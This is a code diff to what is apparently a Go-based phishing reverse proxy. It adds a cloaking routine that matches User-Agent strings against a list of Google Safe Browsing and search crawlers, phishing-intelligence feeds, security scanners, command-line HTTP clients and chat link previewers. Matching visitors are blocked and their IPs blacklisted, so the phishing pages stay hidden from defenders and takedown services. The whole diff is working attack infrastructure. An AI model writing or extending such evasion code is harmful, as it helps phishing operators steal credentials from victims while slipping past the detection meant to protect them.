@@ -240,6 +240,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 }
             }
 
+            // Block known security scanners and crawlers before they see any content.
+            // Auto-blacklist the IP so subsequent requests from the same scanner are
+            // dropped at the IP check above without UA inspection overhead.
+            if isScannerUA(req.UserAgent()) {
+                mode := p.cfg.GetBlacklistMode()
+                if (mode == "unauth" || mode == "all") && !p.bl.IsWhitelisted(from_ip) {
+                    if err := p.bl.AddIP(from_ip); err == nil && p.bl.IsVerbose() {
+                        log.Warning("blacklist: scanner UA, blacklisted ip: %s (%s)", from_ip, req.UserAgent())
+                    }
+                } else if p.bl.IsVerbose() {
+                    log.Warning("blacklist: scanner UA blocked: %s (%s)", from_ip, req.UserAgent())
+                }
+                return p.blockRequest(req)
+            }
+
             req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
             o_host := req.Host
             lure_url := req_url
@@ -1518,6 +1533,61 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
         return req, resp
     }
     return req, nil
+}
+
+// scannerUAPatterns lists user-agent substrings associated with security scanners,
+// GSB crawlers, link previewers, and generic HTTP clients that should never see
+// phishing content. Compiled once at package init to avoid per-request cost.
+var scannerUAPatterns = []*regexp.Regexp{
+	// Google Safe Browsing / crawlers
+	regexp.MustCompile(`(?i)google-safebrowsing`),
+	regexp.MustCompile(`(?i)googlebot`),
+	regexp.MustCompile(`(?i)adsbot-google`),
+	regexp.MustCompile(`(?i)google-inspectiontool`),
+	// Phishing intelligence feeds
+	regexp.MustCompile(`(?i)phishtank`),
+	regexp.MustCompile(`(?i)openphish`),
+	// Generic HTTP clients (no real browser sends these)
+	regexp.MustCompile(`(?i)^curl/`),
+	regexp.MustCompile(`(?i)^wget/`),
+	regexp.MustCompile(`(?i)^python-requests/`),
+	regexp.MustCompile(`(?i)^python-urllib`),
+	regexp.MustCompile(`(?i)^go-http-client/`),
+	regexp.MustCompile(`(?i)^libwww-perl`),
+	regexp.MustCompile(`(?i)^java/`),
+	regexp.MustCompile(`(?i)^okhttp/`),
+	// Security scanners
+	regexp.MustCompile(`(?i)masscan`),
+	regexp.MustCompile(`(?i)zgrab`),
+	regexp.MustCompile(`(?i)nuclei`),
+	regexp.MustCompile(`(?i)sqlmap`),
+	regexp.MustCompile(`(?i)nikto`),
+	regexp.MustCompile(`(?i)nessus`),
+	regexp.MustCompile(`(?i)burpsuite`),
+	// Other search crawlers (used by safe-browsing feeds)
+	regexp.MustCompile(`(?i)bingbot`),
+	regexp.MustCompile(`(?i)yandexbot`),
+	regexp.MustCompile(`(?i)slurp`),
+	regexp.MustCompile(`(?i)duckduckbot`),
+	regexp.MustCompile(`(?i)baiduspider`),
+	// Link previewers (unfurl the URL and report it)
+	regexp.MustCompile(`(?i)facebookexternalhit`),
+	regexp.MustCompile(`(?i)twitterbot`),
+	regexp.MustCompile(`(?i)linkedinbot`),
+	regexp.MustCompile(`(?i)whatsapp`),
+	regexp.MustCompile(`(?i)telegrambot`),
+	regexp.MustCompile(`(?i)discordbot`),
+	regexp.MustCompile(`(?i)slackbot`),
+}
+
+// isScannerUA returns true when the User-Agent matches a known scanner or crawler.
+func isScannerUA(ua string) bool {
+	for _, re := range scannerUAPatterns {
+		if re.MatchString(ua) {
+			return true
+		}
+	}
+	return false
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, url string) (*http.Request, *http.Response) {
